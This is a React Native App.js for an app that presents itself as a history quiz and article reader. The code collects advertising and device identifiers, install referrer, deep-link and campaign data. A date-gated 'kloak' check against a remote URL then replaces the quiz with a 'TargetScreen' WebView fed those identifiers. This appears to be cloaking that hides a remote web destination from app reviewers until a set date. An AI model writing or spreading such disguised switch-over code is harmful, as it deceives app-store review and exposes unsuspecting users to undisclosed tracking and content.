import React, {useEffect, useState, useRef, useMemo, useCallback} from 'react';
import {createNativeStackNavigator} from '@react-navigation/native-stack';
import {NavigationContainer} from '@react-navigation/native';
import {createBottomTabNavigator} from '@react-navigation/bottom-tabs';
import {HistoryProvider} from './store/storeContext';
import {
  ArticleDetailScreen,
  HistoryGameScreen,
  HistoryIntroductionScreen,
  HistoryMapScreen,
  LevelScren,
  LibraryArticles,
  QuizScreen,
} from './screen';
import CityHaractersScreen from './screen/CityHaractersScreen';
import {ArticleIcon, QuizIcon, UserIcon} from './components/ui/tabBtn';
import {Color} from './colors/color';
import {Dimensions} from 'react-native';
import {handleGetAaid} from './config/getAaid';
import AsyncStorage from '@react-native-async-storage/async-storage';
import {OneSignal, LogLevel} from 'react-native-onesignal';
import appsFlyer from 'react-native-appsflyer';
import DeviceInfo from 'react-native-device-info';
import FBDeepLink from 'react-native-fb-deeplink';
import {PlayInstallReferrer} from 'react-native-play-install-referrer';
import {
  option,
  FB_APP_ID,
  FB_CLIENT_TOKEN,
  INITIAL_URL,
  URL_IDENTIFAIRE,
} from './config/credentials';
import CustomWelcome from './screen/Target/CustomWelcome';
import TargetScreen from './screen/Target/TargetScreen';

const {height} = Dimensions.get('window');

const Stack = createNativeStackNavigator();
const Tab = createBottomTabNavigator();

const generateTimestampUserId = () => {
  return `${new Date().getTime()}-${Math.floor(
    1000000 + Math.random() * 9000000,
  )}`;
};
const targetData = new Date('2025-04-13T22:00:00Z');
const currentDate = new Date();

const TabNavigator = () => {
  return (
    <Tab.Navigator
      screenOptions={{
        title: '',
        headerShown: false,
        tabBarStyle: {
          position: 'absolute',
          bottom: 10,
          left: 10,
          right: 10,
          elevation: 0,
          borderRadius: 40,
          height: 80,
          paddingTop: height > 670 ? 10 : 10,
          backgroundColor: Color.deepBlue,
          overflow: 'hidden', // This is important for the BlurView
          borderTopWidth: 0,
        },
      }}>
      <Tab.Screen
        name="HistoryGameScreen"
        component={HistoryGameScreen}
        options={{tabBarIcon: ({focused}) => <QuizIcon focused={focused} />}}
      />
      <Tab.Screen
        name="userScreen"
        component={CityHaractersScreen}
        options={{tabBarIcon: ({focused}) => <UserIcon focused={focused} />}}
      />
      <Tab.Screen
        name="libraryArticles"
        component={LibraryArticles}
        options={{tabBarIcon: ({focused}) => <ArticleIcon focused={focused} />}}
      />
    </Tab.Navigator>
  );
};

function App() {
  // screen rendering
  const [isWelcomeComplete, setIsWelcomeComplete] = useState(false);
  // OneSignal
  const [oneSignalUserId, setOneSignalUserId] = useState(null);
  const [isOneSignalReady, setIsOneSignalReady] = useState(false);
  const [oneSignalPermissionStatus, setOneSignalPermissionStatus] =
    useState(false);
  // First Visit check
  const [timeStamp, setTimeStamp] = useState(null);
  const [isFirstVisit, setIsFirstVisit] = useState(null);
  // isReadyToVisitHandler
  const [isReadyToVisit, setIsReadyToVisit] = useState(false);
  const hasCheckedUrl = useRef(false);
  const urlCheckTimeout = useRef(null);
  const [isLoadingParams, setIsLoadingParams] = useState(false);
  // AppsFlyer
  const [idfv, setIdfv] = useState(null);
  const [aaid, setAaid] = useState(null);
  const [applsFlyerUID, setApplsFlyerUID] = useState(null);
  const [isNonOrganicInstall, setIsNonOrganicInstall] = useState(false);
  const [isConversionDataReceived, setIsConversionDataReceived] =
    useState(false);
  const [sabData, setSabData] = useState(null);
  // Push notifications
  const [openWithPush, setOpenWithPush] = useState(false);
  // Referrer
  const [referrer, setReferrer] = useState(null);

  useEffect(() => {
    const getReferrer = async () => {
      PlayInstallReferrer.getInstallReferrerInfo((info, error) => {
        if (!error) {
          console.log(
            console.log('Install referrer = ' + info.installReferrer),
          );
          // console.log(typeof info.installReferrer);
          const referrer = info.installReferrer;
          setReferrer(referrer);
        } else {
          console.log(error);
        }
      });
    };
    getReferrer();
  }, []);

  useEffect(() => {
    const getDeepLink = async () => {
      console.log('Starting deep link fetch...');
      await FBDeepLink.initialize(FB_APP_ID, FB_CLIENT_TOKEN);
      const deepLink = await FBDeepLink.getDeepLink();
      console.log('Received deep link:', deepLink);
      if (deepLink && deepLink.length > 0) {
        const parseDeepArray = deepLink.split('?')[1];
        // console.log(parseDeepArray);
        console.log('Parsed deep link data:', parseDeepArray);
        // setIsDeeplinkExist(true);
        console.log(
          'Deep link!!!!!!!!!!:',
          deepLink.split('?')[1],
          // .split('sub')
          // .filter(item => item)
          // .map(item => item.split('=')[1].replace('&', '')),
        );
        // setDeepLinkData(parseDeepArray);
        // Save to AsyncStorage immediately
        await AsyncStorage.setItem('isDeeplinkExist', 'true');
        await AsyncStorage.setItem('deepLinkData', parseDeepArray);
        console.log('Saved deep link data to AsyncStorage');
      }
      // Alert.alert('Deep Link ', deepLink, [
      //   {
      //     text: 'Cancel',
      //     onPress: () => Alert.alert('Cancel Pressed'),
      //     style: 'cancel',
      //   },
      // ]);
    };

    getDeepLink();
  }, []);

  useEffect(() => {
    // console.log('FIRST FUNCTION');
    // console.log('OneSignal in  useEffect');
    const initOneSignal = async () => {
      // console.log('initOneSignal');
      // Remove this method to stop OneSignal Debugging
      OneSignal.Debug.setLogLevel(LogLevel.Verbose);
      // OneSignal Initialization
      OneSignal.initialize('bd6dbe8e-7d42-4953-a592-ace89ece8692');

      try {
        // Request permission and get user ID
        const permissionResult =
          await OneSignal.Notifications.requestPermission(true);
        setOneSignalPermissionStatus(permissionResult);
        console.log('OneSignal permission result:', permissionResult);

        // if (permissionResult) {
        const userId = await OneSignal.User.getOnesignalId();
        // console.log('OneSignal: user id:', userId);

        if (userId) {
          setOneSignalUserId(userId);
          await AsyncStorage.setItem('oneSignalUserId', userId);
          // console.log(userId);
          setIsOneSignalReady(true);
        } else {
          // If no userId, set up a listener for when it becomes available
          const userStateChangedListener = OneSignal.User.addEventListener(
            'change',
            async event => {
              const newUserId = await OneSignal.User.getOnesignalId();
              if (newUserId) {
                // console.log('OneSignal: got delayed user id:', newUserId);
                setOneSignalUserId(newUserId);
                await AsyncStorage.setItem('oneSignalUserId', newUserId);
                setIsOneSignalReady(true);
                userStateChangedListener.remove();
              }
            },
          );
        }
        // }
      } catch (error) {
        console.error('Error initializing OneSignal:', error);
        // Fallback: try to get stored userId
        const storedUserId = await AsyncStorage.getItem('oneSignalUserId');
        if (storedUserId) {
          setOneSignalUserId(storedUserId);
          setIsOneSignalReady(true);
        }
      }
    };

    initOneSignal();
  }, []);

  const checkFirstVisit = async () => {
    // console.log('SECOND FUNCTION');
    try {
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      // console.log('hasVisited', hasVisited);

      // Get stored timestamp_user_id first
      let storedTimeStamp = await AsyncStorage.getItem('timeStamp');
      if (!storedTimeStamp) {
        // Generate new timestamp_user_id only if none exists
        storedTimeStamp = generateTimestampUserId();
        await AsyncStorage.setItem('timeStamp', storedTimeStamp);
        // console.log('Generated new timestamp_user_id:', storedTimeStamp);
      } else {
        // console.log('Retrieved stored timestamp_user_id:', storedTimeStamp);
      }

      // Set timestamp for use in app
      setTimeStamp(storedTimeStamp);

      if (!hasVisited) {
        // console.log('First visit');
        setIsFirstVisit(true);

        OneSignal.User.addTag('timestamp_user_id', storedTimeStamp);

        await new Promise(resolve => setTimeout(resolve, 500));

        await AsyncStorage.setItem('hasVisitedBefore', 'true');
      } else {
        // Returning user

        setIsFirstVisit(false);
        // setTimeStamp(parsedTimeStamp);
      }
    } catch (error) {
      console.error('Error checking first visit:', error);
    }
  };

  const isReadyToVisitHandler = async () => {
    // console.log('THIRD FUNCTION');
    if (hasCheckedUrl.current) {
      // console.log('URL check already performed');
      return;
    }

    // Clear any existing timeout
    if (urlCheckTimeout.current) {
      clearTimeout(urlCheckTimeout.current);
    }

    // Set a flag to prevent immediate re-runs
    hasCheckedUrl.current = true;

    try {
      const kloakSuccess = await AsyncStorage.getItem('kloakSuccess');
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');
      const visitUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
      console.log('hasVisited', hasVisited);
      console.log('kloakSuccess', kloakSuccess);

      // Case 1: App was visited before and had successful kloak check
      // if (hasVisited && kloakSuccess) {
      //   console.log('App visited before and kloakSuccess 200');
      //   setIsReadyToVisit(true);
      //   return;
      // }

      if (currentDate >= targetData) {
        if (hasVisited && kloakSuccess) {
          console.log('currentDate >= targetData- WebView will be opened');
          setIsReadyToVisit(true);
        }
        if (!hasVisited) {
          console.log('First visit - checking URL');
          urlCheckTimeout.current = setTimeout(async () => {
            try {
              const response = await fetch(visitUrl);
              console.log('URL status:', response.status);
              console.log('visitUrl', visitUrl);

              if (response.status === 200) {
                await AsyncStorage.setItem('kloakSuccess', 'true');

                if (currentDate >= targetData) {
                  setIsReadyToVisit(true);
                  console.log(
                    'Current date passed target date, ready to visit',
                  );
                } else {
                  setIsReadyToVisit(false);
                  console.log('Current date has not passed target date');
                }
              } else {
                setIsReadyToVisit(false);
              }
            } catch (error) {
              console.log('URL fetch error:', error);
              setIsReadyToVisit(false);
            }
          }, 500); // Add small delay to prevent double calls
        }
      } else {
        console.log('currentDate < targetData- WebView will not open');
        setIsReadyToVisit(false);
      }
    } catch (error) {
      console.log('Error in isReadyToVisitHandler:', error);
      setIsReadyToVisit(false);
    }

    // Cleanup timeout on unmount
    useEffect(() => {
      return () => {
        if (urlCheckTimeout.current) {
          clearTimeout(urlCheckTimeout.current);
        }
      };
    }, []);
  };

  const initAppsFlyer = async () => {
    // console.log('FOURTH FUNCTION');
    try {
      // Set up conversion data listener first
      appsFlyer.onInstallConversionData(async res => {
        console.log('AppsFlyer Conversion Data received:', res);

        // get Referrer
        console.log('SET REFERRER TO APPSFLYER', {referrer});
        appsFlyer.setAdditionalData({referrer}, res => {
          // console.log('setAdditionalData', res);
        });

        // try {
        if (JSON.parse(res.data.is_first_launch) === true) {
          console.log('Is app first launch-', res);

          if (res.data.af_status === 'Non-organic') {
            const media_source = res.data.media_source;
            const campaign = res.data.campaign;
            const af_siteid = res.data.af_siteid ?? '';
            const af_ad = res.data.af_ad || '';
            const af_channel = res.data.af_channel || '';

            try {
              await AsyncStorage.setItem('sabData', campaign);
              await AsyncStorage.setItem('media_source', media_source);
              await AsyncStorage.setItem('af_siteid', af_siteid);
              await AsyncStorage.setItem('af_ad', af_ad);
              await AsyncStorage.setItem('af_channel', af_channel);
              setSabData(campaign);
              await AsyncStorage.setItem('isNonOrganicInstall', 'true');
              setIsNonOrganicInstall(true);
            } catch (error) {
              console.error('Error saving non-organic data:', error);
            }
          } else if (res.data.af_status === 'Organic') {
            console.log('Organic install detected');
            const organicTestData = '';
            const media_source = '';
            const af_siteid = '';
            const af_ad = '';
            const af_channel = '';
            try {
              await AsyncStorage.setItem('sabData', organicTestData);
              setSabData(organicTestData);
              await AsyncStorage.setItem('isNonOrganicInstall', 'false');
              setIsNonOrganicInstall(false);
              await AsyncStorage.setItem('media_source', media_source);
              await AsyncStorage.setItem('af_siteid', af_siteid);
              await AsyncStorage.setItem('af_ad', af_ad);
              await AsyncStorage.setItem('af_channel', af_channel);
              // if (isDeeplinkExist) {
              //   console.log('Saving deep link data:', {
              //     isDeeplinkExist,
              //     deepLinkData,
              //   });
              //   await AsyncStorage.setItem('isDeeplinkExist', 'true');
              //   await AsyncStorage.setItem('deepLinkData', deepLinkData);
              // }
            } catch (error) {
              console.error('Error saving organic data:', error);
            }
          }
          //  else if (res.data.af_status === 'Organic' && isDeeplinkExist) {
          //   console.log('THIS ORGANIC INSTALL AND DEEPLINK EXIST');

          //   await AsyncStorage.setItem('isDeeplinkExist', 'true');
          //   await AsyncStorage.setItem('deepLinkData', deepLinkData);
          // }
        } else {
          console.log('Not first app launch');
          try {
            const storedSabData = await AsyncStorage.getItem('sabData');
            const storedIsNonOrganic = await AsyncStorage.getItem(
              'isNonOrganicInstall',
            );

            if (storedSabData) {
              setSabData(storedSabData);
            }
            setIsNonOrganicInstall(storedIsNonOrganic === 'true');
          } catch (error) {
            console.error('Error retrieving stored data:', error);
          }
        }
        // }
        // catch (err) {
        //   console.error('Error processing AppsFlyer data:', err);
        // }

        setIsConversionDataReceived(true);
      });

      // Get AAID
      const aaid = await handleGetAaid();
      setAaid(aaid);

      // Get device unique ID
      try {
        const deviceId = await DeviceInfo.getUniqueId();
        setIdfv(deviceId);

        // Initialize AppsFlyer SDK
        appsFlyer.initSdk(
          option,
          res => {
            console.log('AppsFlyer SDK initialized successfully:', res);

            // Set customer user ID
            appsFlyer.setCustomerUserId(deviceId);

            // Get AppsFlyer UID
            appsFlyer.getAppsFlyerUID((err, appsFlyerUID) => {
              if (err) {
                console.error(err);
              } else {
                setApplsFlyerUID(appsFlyerUID);
              }
            });
          },
          error => {
            console.error('AppsFlyer SDK failed to start:', error);
            // Set defaults to allow app to continue
            setIsConversionDataReceived(true);
          },
        );

        appsFlyer.startSdk();
      } catch (error) {
        console.error('Error in device info:', error);
        // Set defaults to allow app to continue
        setIdfv('unknown-device');
        setIsConversionDataReceived(true);
      }
    } catch (error) {
      console.error('Error in initAppsFlyer:', error);
      // Set these to true so the app can continue even if AppsFlyer fails
      setIsConversionDataReceived(true);
    }
  };

  useEffect(() => {
    console.log('USEEFFECT FUNC CALL');
    checkFirstVisit();
    isReadyToVisitHandler();
    initAppsFlyer();

    // If it's not first visit, mark conversion data as already received
    if (!isFirstVisit) {
      setIsConversionDataReceived(true);
    }
  }, [isFirstVisit]);

  const handleNotificationClick = useCallback(async event => {
    // console.log('FIFTH funciton');
    // console.log('🔔 Handling notification click:', event);
    const timeStamp = await AsyncStorage.getItem('timeStamp');
    const baseUrl = `${INITIAL_URL}${URL_IDENTIFAIRE}`;
    let finalUrl;

    try {
      // Check if this is first visit
      const hasVisited = await AsyncStorage.getItem('hasVisitedBefore');

      if (event.notification.launchURL) {
        console.log('Regular push_open_browser case');
        finalUrl = `${baseUrl}?utretg=push_open_browser&timestamp_user_id=${timeStamp}`;
        await fetch(finalUrl);
        await Linking.openURL(finalUrl);
        await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));
        setOpenWithPush(true);
      } else {
        console.log('Regular push_open_webview case');
        finalUrl = `${baseUrl}?utretg=push_open_webview&timestamp_user_id=${timeStamp}`;
        setOpenWithPush(true);
        // Set push state in AsyncStorage
        await AsyncStorage.setItem('openedWithPush', JSON.stringify(true));
        // console.log('Set openedWithPush in AsyncStorage');
        if (!hasVisited) {
          await AsyncStorage.setItem('hasVisitedBefore', 'true');
          console.log('Marked as visited for the first time');
        }

        // Update states
        setOpenWithPush(true);
        console.log('Set openWithPush state to true');

        // Make the fetch request
        await fetch(finalUrl);

        // Ensure ready to visit
        // setIsReadyToVisit(true);
      }
    } catch (error) {
      console.error('🔔 Error handling notification:', error);
    }
  }, []);

  useEffect(() => {
    // console.log('SIXTH FUNCTION');
    const setupNotifications = async () => {
      try {
        // Add notification click listener with the handler
        const clickListener = OneSignal.Notifications.addEventListener(
          'click',
          event => {
            // console.log('🔔 Notification clicked:', event);
            handleNotificationClick(event);
          },
        );
        // ... rest of your notification setup ...

        return () => {
          clickListener.remove();
          // ... other cleanup ...
        };
      } catch (error) {
        console.error('🔔 Error setting up notifications:', error);
      }
    };

    setupNotifications();
  }, []);

  // Update isReadyForTestScreen to include OneSignal check
  const isReadyForTestScreen = useMemo(() => {
    // Basic requirements for all launches
    const baseRequirements =
      isReadyToVisit &&
      aaid &&
      applsFlyerUID &&
      idfv &&
      timeStamp &&
      isConversionDataReceived &&
      isOneSignalReady &&
      oneSignalUserId &&
      isWelcomeComplete;

    // For first launch, also require sabData
    if (isFirstVisit) {
      return baseRequirements;
    }

    // For subsequent launches, only need base requirements
    return baseRequirements;
  }, [
    isReadyToVisit,
    aaid,
    applsFlyerUID,
    idfv,
    timeStamp,
    isConversionDataReceived,
    isOneSignalReady,
    oneSignalUserId,
    isFirstVisit,
    openWithPush,
    isWelcomeComplete,
  ]);

  // Add effect to update loading state
  useEffect(() => {
    if (isReadyForTestScreen) {
      setIsLoadingParams(false);
    }
  }, [isReadyForTestScreen]);

  const handleWelcomeComplete = useCallback(() => {
    setIsWelcomeComplete(true);
  }, []);

  return (
    <HistoryProvider>
      <NavigationContainer>
        <Stack.Navigator
          screenOptions={{
            headerShown: false,
            animation: 'simple_push',
            animationDuration: 1000,
          }}>
          {!isWelcomeComplete ? (
            <Stack.Screen name="WelcomeScreen">
              {props => (
                <CustomWelcome
                  {...props}
                  onWelcomeComplete={handleWelcomeComplete}
                />
              )}
            </Stack.Screen>
          ) : isReadyForTestScreen ? (
            <Stack.Screen
              name="TargetScreen"
              component={TargetScreen}
              initialParams={{
                idfa: aaid,
                oneSignalUserId,
                idfv,
                applsFlyerUID,
                timestamp_user_id: timeStamp,
                isFirstVisit,
                timeStamp,
                // naming,
                oneSignalPermissionStatus,
                isNonOrganicInstall,
                openWithPush,
                ...(isFirstVisit && {sabData}),
              }}
            />
          ) : (
            <>
              <Stack.Screen name="TabNavigator" component={TabNavigator} />
              <Stack.Screen
                name="HistoryMapScreen"
                component={HistoryMapScreen}
              />
              <Stack.Screen name="LevelScreen" component={LevelScren} />
              <Stack.Screen name="QuizScreen" component={QuizScreen} />
              <Stack.Screen
                name="ArticleDetail"
                component={ArticleDetailScreen}
              />
            </>
          )}
          {/* <Stack.Screen
            name="HistoryIntroductionScreen"
            component={HistoryIntroductionScreen}
          /> */}
          {/* <Stack.Screen name="TabNavigator" component={TabNavigator} />
          <Stack.Screen name="HistoryMapScreen" component={HistoryMapScreen} />
          <Stack.Screen name="LevelScreen" component={LevelScren} />
          <Stack.Screen name="QuizScreen" component={QuizScreen} />
          <Stack.Screen name="ArticleDetail" component={ArticleDetailScreen} /> */}
        </Stack.Navigator>
      </NavigationContainer>
    </HistoryProvider>
  );
}

export default App;
